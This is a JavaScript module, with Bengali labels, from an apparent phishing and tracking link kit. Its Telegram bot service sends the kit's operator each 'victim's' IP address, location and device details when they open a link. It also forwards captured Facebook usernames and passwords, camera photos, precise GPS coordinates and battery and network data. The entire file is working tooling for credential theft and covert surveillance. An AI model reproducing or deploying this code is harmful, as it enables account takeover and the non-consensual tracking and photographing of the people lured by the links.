const User = require('../models/User');
const Link = require('../models/Link');
const Data = require('../models/Data');

class NotificationService {
  constructor(bot) {
    this.bot = bot;
  }
  
  // নতুন ভিজিটর নোটিফিকেশন
  async sendVisitorNotification(linkId, visitorData) {
    try {
      const link = await Link.findOne({ linkId });
      if (!link) return;
      
      const user = await User.findOne({ userId: link.userId });
      if (!user || !user.settings.notifications) return;
      
      const message = `👁️ 𝐍𝐄𝐖 𝐕𝐈𝐒𝐈𝐓𝐎𝐑 𝐃𝐄𝐓𝐄𝐂𝐓𝐄𝐃\n\n` +
        `লিঙ্ক আইডি: ${linkId}\n` +
        `ভিকটিম আইপি: ${visitorData.ip}\n` +
        `লোকেশন: ${visitorData.location.city}, ${visitorData.location.country}\n` +
        `ডিভাইস: ${visitorData.device}\n` +
        `ব্রাউজার: ${visitorData.browser}\n` +
        `সময়: ${visitorData.time}\n\n` +
        `মোট ভিজিট: ${link.visits}`;
      
      await this.bot.sendMessage(user.userId, message);
    } catch (error) {
      console.error('Notification Error:', error);
    }
  }
  
  // নতুন ডাটা নোটিফিকেশন
  async sendDataNotification(linkId, data) {
    try {
      const link = await Link.findOne({ linkId });
      if (!link) return;
      
      const user = await User.findOne({ userId: link.userId });
      if (!user || !user.settings.notifications) return;
      
      const totalData = await Data.countDocuments({ linkId });
      
      let message = '';
      
      switch (data.type) {
        case 'fb':
          message = `🔐 𝐍𝐄𝐖 𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 𝐃𝐀𝐓𝐀 𝐑𝐄𝐂𝐄𝐈𝐕𝐄𝐃\n\n` +
            `📧 ইমেইল/ইউজারনেম: ${data.data.username}\n` +
            `🔑 পাসওয়ার্ড: ${data.data.password}\n` +
            `🌍 আইপি: ${data.ip}\n` +
            `📍 লোকেশন: ${data.location.city}, ${data.location.country}\n` +
            `📱 ডিভাইস: ${data.device.device}\n` +
            `🕐 টাইম: ${data.timestamp}\n\n` +
            `📌 লিঙ্ক আইডি: ${linkId}\n` +
            `📊 মোট ডাটা: ${totalData}`;
          break;
          
        case 'camera':
          message = `📸 𝐍𝐄𝐖 𝐂𝐀𝐌𝐄𝐑𝐀 𝐂𝐀𝐏𝐓𝐔𝐑𝐄\n\n` +
            `লিঙ্ক আইডি: ${linkId}\n` +
            `টাইমস্ট্যাম্প: ${data.timestamp}\n` +
            `আইপি: ${data.ip}\n` +
            `লোকেশন: ${data.location.city}, ${data.location.country}\n` +
            `📊 ফটো সাইজ: ${data.data.size}\n` +
            `🔄 অটো-ফরওয়ার্ডেড`;
          break;
          
        case 'location':
          message = `📍 𝐋𝐎𝐂𝐀𝐓𝐈𝐎𝐍 𝐂𝐀𝐏𝐓𝐔𝐑𝐄𝐃\n\n` +
            `🗺️ গুগল ম্যাপ: ${data.data.mapsUrl}\n` +
            `📌 কোঅর্ডিনেটস:\n` +
            `ল্যাট: ${data.data.lat}\n` +
            `লং: ${data.data.lng}\n` +
            `একুরেসি: ${data.data.accuracy} মিটার\n\n` +
            `🌍 লোকেশন: ${data.location.city}, ${data.location.country}\n` +
            `📱 ডিভাইস: ${data.device.device}`;
          break;
          
        case 'info':
          message = `📱 𝐃𝐄𝐕𝐈𝐂𝐄 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍\n\n` +
            `🌐 আইপি: ${data.ip}\n` +
            `📍 লোকেশন: ${data.location.city}, ${data.location.country}\n` +
            `📱 ডিভাইস: ${data.device.device}\n` +
            `• ওএস: ${data.device.os}\n` +
            `• ব্রাউজার: ${data.device.browser}\n` +
            `• স্ক্রিন: ${data.data.screen}\n\n` +
            `🔋 ব্যাটারি: ${data.data.battery}%\n` +
            `📶 নেটওয়ার্ক: ${data.data.network}\n` +
            `🕐 টাইমজোন: ${data.data.timezone}`;
          break;
      }
      
      await this.bot.sendMessage(user.userId, message);
      
    } catch (error) {
      console.error('Data Notification Error:', error);
    }
  }
  
  // অ্যাডমিন নোটিফিকেশন
  async sendAdminNotification(message) {
    try {
      const adminIds = (process.env.ADMIN_IDS || '')
        .split(',')
        .map(id => parseInt(id.trim(), 10))
        .filter(Number.isInteger);
      
      for (const adminId of adminIds) {
        await this.bot.sendMessage(adminId, message);
      }
    } catch (error) {
      console.error('Admin Notification Error:', error);
    }
  }
}

module.exports = NotificationService;
